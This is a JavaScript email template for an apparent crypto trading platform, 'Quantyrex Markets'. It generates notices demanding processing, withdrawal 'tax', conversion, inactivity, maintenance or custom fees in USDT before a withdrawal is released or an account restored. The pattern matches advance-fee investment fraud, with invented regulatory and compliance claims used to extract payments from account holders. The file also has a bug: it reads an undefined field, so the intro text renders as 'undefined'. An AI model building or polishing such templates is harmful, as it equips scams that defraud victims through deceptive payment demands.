const baseProTemplate = require('./base-pro');
const { formatUSD } = require('./_money');

const FRONTEND_URL = process.env.FRONTEND_URL || 'https://quantyrexmarkets.vercel.app';

const FEE_CONTENT = {
  processing: {
    badge: 'TRANSACTION NOTICE',
    title: 'Transaction Verification Required',
    subtitle: 'To complete your withdrawal request, a verification and network processing charge is required for transaction authorization and compliance checks.',
    txType: 'Withdrawal',
    feeTypeLabel: 'Processing Fee',
    covers: ['Transaction Validation & Verification', 'Secure Network Transfer Authorization', 'Anti-Fraud Security Screening', 'Network Costs & Processing Services'],
    urgency: 'Please complete the fee payment to continue processing your transaction.',
    btnLabel: 'COMPLETE VERIFICATION'
  },
  tax: {
    badge: 'TAX NOTICE',
    title: 'Withdrawal Tax Fee Required',
    subtitle: 'In accordance with current financial regulations, a withdrawal tax must be settled before your transaction can be released. This is a regulatory compliance requirement.',
    txType: 'Tax Settlement',
    feeTypeLabel: 'Withdrawal Tax Fee',
    covers: ['Regulatory Compliance Filing', 'Government-Mandated Reporting', 'Audit Trail Documentation', 'Withdrawal Release Authorization'],
    urgency: 'Please complete the tax payment to release your withdrawal.',
    btnLabel: 'SETTLE TAX FEE'
  },
  conversion: {
    badge: 'CONVERSION NOTICE',
    title: 'Currency Conversion Fee Required',
    subtitle: 'A currency conversion fee applies to your transaction. This covers real-time exchange rate processing and multi-currency settlement services.',
    txType: 'Currency Conversion',
    feeTypeLabel: 'Currency Conversion Fee',
    covers: ['Real-Time Exchange Rate Processing', 'Multi-Currency Conversion Engine', 'Settlement Authorization', 'Conversion Verification'],
    urgency: 'Please complete the fee payment to finalize your conversion.',
    btnLabel: 'COMPLETE CONVERSION'
  },
  inactivity: {
    badge: 'REACTIVATION NOTICE',
    title: 'Account Reactivation Required',
    subtitle: 'Your account has been inactive for an extended period. An inactivity fee is required to reactivate your account and restore full trading privileges.',
    txType: 'Account Reactivation',
    feeTypeLabel: 'Account Inactivity Fee',
    covers: ['Full Trading Access Restoration', 'Withdrawal & Deposit Re-enablement', 'Bots & Copy Trading Activation', 'Account Security Refresh'],
    urgency: 'Welcome back. Please complete the fee payment to reactivate your account.',
    btnLabel: 'REACTIVATE ACCOUNT'
  },
  maintenance: {
    badge: 'MAINTENANCE NOTICE',
    title: 'Account Maintenance Fee Required',
    subtitle: 'A routine maintenance fee is required to keep your account operational. This covers infrastructure, security, and 24/7 platform monitoring.',
    txType: 'Account Maintenance',
    feeTypeLabel: 'Account Maintenance Fee',
    covers: ['Server Infrastructure & Uptime', '24/7 Security Monitoring', 'Continuous Platform Updates', 'Account Services Continuity'],
    urgency: 'Please complete the fee payment to maintain account services.',
    btnLabel: 'SETTLE MAINTENANCE FEE'
  },
  custom: {
    badge: 'TRANSACTION NOTICE',
    title: 'Outstanding Fee Notice',
    subtitle: 'An outstanding fee has been applied to your account that requires immediate attention. Please review the details below and complete the payment.',
    txType: 'Fee Settlement',
    feeTypeLabel: 'Outstanding Fee',
    covers: ['Transaction Authorization', 'Account Service Continuity', 'Payment Processing', 'Settlement Verification'],
    urgency: 'Please complete the fee payment to continue using your account.',
    btnLabel: 'COMPLETE PAYMENT'
  }
};

const friendlyLabel = (label, fallback) => {
  if (!label) return fallback;
  const raw = ['processing','tax','conversion','inactivity','maintenance','custom'];
  if (raw.includes(label.toLowerCase())) return fallback;
  return label.replace(/\b\w/g, c => c.toUpperCase());
};

const feeRequiredEmail = (name, feeLabel, feeAmount, currency, feeType, userId) => {
  const fee = FEE_CONTENT[feeType] || FEE_CONTENT.custom;
  const clientId = userId ? '#QXM-' + String(userId).slice(-5).toUpperCase() : '#QXM-' + Math.floor(Math.random() * 90000 + 10000);
  const now = new Date();
  const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true }) + ' UTC';
  const displayFeeLabel = friendlyLabel(feeLabel, fee.feeTypeLabel);

  const FONT = "'Montserrat',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif";

  // Title with accent word
  const titleParts = fee.title.split(' ');
  const accentWord = titleParts.pop();
  const mainTitle = titleParts.join(' ');

  // Detail item - label on top, value below (matches screenshot)
  const detailItem = (label, value) => `<td width="50%" valign="top" style="padding:18px 20px;">
<div style="color:#5a6a85;font-size:11px;font-weight:600;letter-spacing:1.5px;font-family:${FONT};margin-bottom:8px;">${label}</div>
<div style="color:#ffffff;font-size:15px;font-weight:600;font-family:${FONT};line-height:1.4;">${value}</div>
</td>`;

  // Fee breakdown item (simple text row with bottom border)
  const breakdownItem = (text, isLast) => `<tr>
<td style="padding:14px 20px;color:#d4d4d8;font-size:13px;font-family:${FONT};${isLast ? '' : 'border-bottom:1px solid #1a2540;'}">${text}</td>
</tr>`;

  return baseProTemplate(`

<!-- HEADER WITH MONTSERRAT LOGO -->
<tr>
<td bgcolor="#000000" style="background:#000000;padding:32px 28px 24px 28px;">
<div style="font-family:${FONT};">
<span style="color:#ffffff;font-size:22px;font-weight:300;letter-spacing:0.3px;">Quantyrex</span>
<span style="color:#3b82f6;font-size:22px;font-weight:300;letter-spacing:0.3px;margin-left:8px;">Markets</span>
</div>
</td>
</tr>

<!-- MAIN CARD CONTAINER -->
<tr>
<td bgcolor="#000000" style="background:#000000;padding:0 16px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0a1428" style="background:#0a1428;border-radius:16px;border:1px solid #1a2540;">

<!-- BADGE -->
<tr>
<td style="padding:28px 28px 16px 28px;">
<div style="color:#3b82f6;font-size:11px;font-weight:700;letter-spacing:2.5px;font-family:${FONT};">${fee.badge}</div>
</td>
</tr>

<!-- TITLE WITH ACCENT WORD -->
<tr>
<td style="padding:0 28px 14px 28px;">
<div style="color:#ffffff;font-size:28px;font-weight:700;line-height:1.2;letter-spacing:-0.5px;font-family:${FONT};">${mainTitle}</div>
<div style="color:#3b82f6;font-size:28px;font-weight:700;line-height:1.2;letter-spacing:-0.5px;font-family:${FONT};margin-top:2px;">${accentWord}</div>
</td>
</tr>

<!-- BLUE UNDERLINE -->
<tr>
<td style="padding:0 28px 22px 28px;">
<table cellpadding="0" cellspacing="0" border="0"><tr>
<td width="40" height="3" bgcolor="#3b82f6" style="width:40px;height:3px;background:#3b82f6;font-size:0;line-height:3px;">&nbsp;</td>
</tr></table>
</td>
</tr>

<!-- SUBTITLE -->
<tr>
<td style="padding:0 28px 32px 28px;color:#9ca3af;font-size:14px;line-height:1.7;font-family:${FONT};">${fee.intro}</td>
</tr>

<!-- DETAILS CARD (2x2 grid) -->
<tr>
<td style="padding:0 20px 16px 20px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0f1a2e" style="background:#0f1a2e;border-radius:12px;border:1px solid #1e2a44;">
<tr>
${detailItem('CLIENT ID', clientId)}
${detailItem('TRANSACTION TYPE', fee.txType)}
</tr>
<tr><td colspan="2" style="border-top:1px solid #1e2a44;height:1px;font-size:0;line-height:0;">&nbsp;</td></tr>
<tr>
${detailItem('NETWORK', 'USDT (TRC20)')}
${detailItem('DATE & TIME', dateStr + '<br>' + timeStr)}
</tr>
</table>
</td>
</tr>

<!-- AMOUNT DUE CARD (blue accent) -->
<tr>
<td style="padding:0 20px 16px 20px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0d2347" style="background:#0d2347;border-radius:12px;border:1px solid #1e3a8a;">
<tr>
<td width="50%" valign="top" style="padding:24px 24px;border-right:1px solid #1e3a8a;">
<div style="color:#7a8aa8;font-size:11px;font-weight:600;letter-spacing:1.5px;font-family:${FONT};margin-bottom:10px;">AMOUNT DUE</div>
<div style="color:#ffffff;font-size:30px;font-weight:700;line-height:1;letter-spacing:-1px;font-family:${FONT};">${formatUSD(feeAmount)}</div>
</td>
<td width="50%" valign="top" style="padding:24px 24px;">
<div style="color:#7a8aa8;font-size:11px;font-weight:600;letter-spacing:1.5px;font-family:${FONT};margin-bottom:10px;">FEE TYPE</div>
<table cellpadding="0" cellspacing="0" border="0" style="margin-bottom:10px;"><tr>
<td width="20" height="2" bgcolor="#3b82f6" style="width:20px;height:2px;background:#3b82f6;font-size:0;line-height:2px;">&nbsp;</td>
</tr></table>
<div style="color:#3b82f6;font-size:17px;font-weight:600;font-family:${FONT};line-height:1.2;">${displayFeeLabel}</div>
</td>
</tr>
</table>
</td>
</tr>

<!-- FEE BREAKDOWN -->
<tr>
<td style="padding:0 20px 16px 20px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0f1a2e" style="background:#0f1a2e;border-radius:12px;border:1px solid #1e2a44;">
<tr><td style="padding:18px 20px 10px 20px;">
<div style="color:#3b82f6;font-size:11px;font-weight:700;letter-spacing:2px;font-family:${FONT};">FEE BREAKDOWN</div>
</td></tr>
<tr><td style="padding:0;">
<table width="100%" cellpadding="0" cellspacing="0" border="0">
${breakdownItem(fee.covers[0], false)}
${breakdownItem(fee.covers[1], false)}
${breakdownItem(fee.covers[2], false)}
${breakdownItem(fee.covers[3], true)}
</table>
</td></tr>
</table>
</td>
</tr>

<!-- ACTION CARD -->
<tr>
<td style="padding:0 20px 28px 20px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0f1a2e" style="background:#0f1a2e;border-radius:12px;border:1px solid #1e2a44;">
<tr><td style="padding:22px 22px 18px 22px;color:#d4d4d8;font-size:14px;line-height:1.6;font-family:${FONT};">
Please complete the fee payment to continue <a href="${FRONTEND_URL}/dashboard" style="color:#3b82f6;text-decoration:none;font-weight:600;">processing your transaction</a>.
</td></tr>
<tr><td style="padding:0 22px 22px 22px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr><td bgcolor="#3b82f6" align="center" style="background:#3b82f6;border-radius:10px;">
<a href="${FRONTEND_URL}/dashboard" style="display:block;padding:18px;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:1.5px;text-decoration:none;font-family:${FONT};text-align:center;">${fee.btnLabel.toUpperCase()}</a>
</td></tr>
</table>
</td></tr>
</table>
</td>
</tr>

<!-- SECURITY FOOTER (inside card) -->
<tr>
<td style="padding:0 20px 28px 20px;">
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#0f1a2e" style="background:#0f1a2e;border-radius:12px;border:1px solid #1e2a44;">
<tr><td style="padding:20px 22px;color:#7a8aa8;font-size:12px;line-height:1.8;font-family:${FONT};">
All transactions are protected with bank-grade encryption.<br>
If you have any questions, our support team is available 24/7.<br>
This is an automated message. Please do not reply.
</td></tr>
</table>
</td>
</tr>

</table>
</td>
</tr>

<!-- FOOTER -->
<tr>
<td bgcolor="#000000" style="background:#000000;padding:28px 28px 32px 28px;text-align:center;">
<div style="font-family:${FONT};margin-bottom:10px;">
<span style="color:#ffffff;font-size:14px;font-weight:300;letter-spacing:0.3px;">Quantyrex</span>
<span style="color:#3b82f6;font-size:14px;font-weight:300;letter-spacing:0.3px;margin-left:6px;">Markets</span>
</div>
<div style="color:#5a6a85;font-size:11px;font-family:${FONT};">
<a href="mailto:support@quantyrexmarkets.com" style="color:#5a6a85;text-decoration:none;">support@quantyrexmarkets.com</a>
</div>
<div style="color:#3a4a65;font-size:10px;font-family:${FONT};margin-top:12px;">
&copy; ${new Date().getFullYear()} Quantyrex Markets. All rights reserved.
</div>
</td>
</tr>

`);
};

module.exports = feeRequiredEmail;
